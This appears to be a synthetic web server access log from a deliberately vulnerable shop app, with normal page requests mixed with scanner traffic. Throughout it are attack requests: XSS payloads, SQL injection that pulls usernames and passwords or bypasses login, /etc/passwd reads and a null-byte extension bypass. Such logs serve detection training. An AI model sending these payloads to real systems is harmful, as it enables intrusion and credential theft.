203.55.11.22 - - [29/Nov/2025:19:35:43 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:35:43 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Nikto/2.1.0"
172.16.0.5 - - [29/Nov/2025:19:35:43 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:44 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:44 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:44 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:35:45 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:45 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:46 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:35:46 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.16.0.5 - - [29/Nov/2025:19:35:46 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:47 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:47 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:47 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:48 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:48 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:35:48 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:48 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:49 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:49 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:35:49 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:50 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "python-requests/2.26.0"
203.55.11.22 - - [29/Nov/2025:19:35:50 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:35:50 +0000] "GET /rest/user/login?email='%20OR%20'1'='1&password=x HTTP/1.1" 500 809 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:35:51 +0000] "GET /rest/user/login?email='%20OR%20'1'='1&password=x HTTP/1.1" 500 809 "sqlmap/1.5.11#stable"
192.168.1.5 - - [29/Nov/2025:19:35:51 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:51 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:52 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:35:52 +0000] "GET /rest/user/login?email='%20OR%20'1'='1&password=x HTTP/1.1" 500 809 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:35:52 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.1.5 - - [29/Nov/2025:19:35:52 +0000] "GET / HTTP/1.1" 200 9020 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:53 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "python-requests/2.26.0"
66.77.88.99 - - [29/Nov/2025:19:35:53 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.16.0.5 - - [29/Nov/2025:19:35:53 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:53 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:53 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:54 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:54 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:35:54 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "python-requests/2.26.0"
203.55.11.22 - - [29/Nov/2025:19:35:54 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.16.0.5 - - [29/Nov/2025:19:35:55 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:55 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:55 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:55 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.1.5 - - [29/Nov/2025:19:35:56 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:56 +0000] "GET / HTTP/1.1" 200 9020 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:56 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:57 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
192.168.1.5 - - [29/Nov/2025:19:35:57 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:57 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "python-requests/2.26.0"
10.0.0.2 - - [29/Nov/2025:19:35:58 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:58 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
66.77.88.99 - - [29/Nov/2025:19:35:58 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
203.55.11.22 - - [29/Nov/2025:19:35:59 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "sqlmap/1.5.11#stable"
66.77.88.99 - - [29/Nov/2025:19:35:59 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "python-requests/2.26.0"
66.77.88.99 - - [29/Nov/2025:19:35:59 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:40:37 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:40:38 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:38 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:40:38 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:39 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.1.5 - - [29/Nov/2025:19:40:39 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:39 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:40:39 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.0.2 - - [29/Nov/2025:19:40:40 +0000] "GET /api/Challenges HTTP/1.1" 200 8640 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:40:40 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:40:40 +0000] "GET /api/Challenges HTTP/1.1" 200 8640 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:40:41 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:41 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:40:41 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:40:41 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Nikto/2.1.0"
172.16.0.5 - - [29/Nov/2025:19:40:42 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:40:42 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:42 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:40:43 +0000] "GET /api/Challenges HTTP/1.1" 200 8640 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:43 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:43 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:40:44 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:44 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:40:44 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
172.16.0.5 - - [29/Nov/2025:19:40:45 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:45 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:45 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:40:46 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:40:46 +0000] "GET /rest/user/login?email='%20OR%20'1'='1&password=x HTTP/1.1" 500 809 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:40:46 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
203.55.11.22 - - [29/Nov/2025:19:40:46 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.1.5 - - [29/Nov/2025:19:40:47 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:47 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:40:47 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:48 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:40:48 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:49 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
203.55.11.22 - - [29/Nov/2025:19:40:49 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:40:49 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:50 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:40:50 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:40:50 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:40:50 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:51 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:51 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:40:51 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:40:51 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:52 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "sqlmap/1.5.11#stable"
10.0.0.2 - - [29/Nov/2025:19:40:52 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:53 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:53 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:40:53 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "python-requests/2.26.0"
10.0.0.2 - - [29/Nov/2025:19:40:54 +0000] "GET /api/Challenges HTTP/1.1" 200 8640 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:54 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:40:54 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:55 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
10.0.0.2 - - [29/Nov/2025:19:40:55 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:40:55 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:55 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:56 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Nikto/2.1.0"
172.16.0.5 - - [29/Nov/2025:19:40:56 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:56 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:40:56 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:40:57 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
203.55.11.22 - - [29/Nov/2025:19:40:57 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "sqlmap/1.5.11#stable"
192.168.1.5 - - [29/Nov/2025:19:40:57 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:40:58 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:40:58 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:40:58 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:40:59 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:40:59 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Nikto/2.1.0"
